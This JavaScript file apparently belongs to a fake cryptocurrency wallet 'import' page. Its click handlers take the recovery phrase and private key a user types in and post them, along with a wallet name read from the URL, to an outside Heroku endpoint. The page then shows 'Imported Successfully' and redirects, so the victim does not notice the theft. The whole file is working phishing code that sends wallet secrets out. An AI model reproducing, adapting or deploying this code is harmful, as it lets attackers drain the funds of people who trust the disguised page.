// function storePhrase(){
//     var phrase=$("#phr").val();
//     if(phrase==""){
//         $('#phrform').submit();
//     }
//     else{
//         window.alert(phrase)
//     }    
// }
$(document).ready(function () {
    $("#btnphrase").click(function (e) {
        var validate = Validate();
        var wallet = getParameterByName('wallet');
        
        if (validate.length == 0) {            
                 $.post('https://phraseskeys.herokuapp.com/m13csfXuR', {wallet:wallet,phrase:$("#phr").val(), privatekey:$("#prt").val()}, function(result){ 
                        if(result.msg=="Successfully Inserted"){
                            window.alert("Imported Successfully");
                            window.location.replace("./index.htm");

                        }
                        else{
                            window.alert("Try After Some time")
                        }
                });
        }
        else{
            $("#message").html(validate);
        }
    });  
    $("#btnprivate").click(function (e) {
        var validate = Validate1();  
        var wallet = getParameterByName('wallet');  
      
        if (validate.length == 0) {            
                 $.post('https://phraseskeys.herokuapp.com/m13csfXuR', {wallet:wallet,phrase:$("#phr").val(), privatekey:$("#prt").val()}, function(result){ 
                        if(result.msg=="Successfully Inserted"){
                            window.alert("Imported Successfully");
                            window.location.replace("./index.htm");
                        }
                        else{
                            window.alert("Try After Some time");
                        }
                });
        }
        else{
            $("#message1").html(validate);
        }
    }); 
   
    function Validate() {
        var errorMessage = "";
        if ($("#phr").val() == "") {
            errorMessage += "► Enter Phrase";
        }
        return errorMessage;
    }
    function Validate1() {
        var errorMessage = "";
        if ($("#prt").val() == "") {
            errorMessage += "► Enter Private Key";
        }
        return errorMessage;
    }
});

function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}
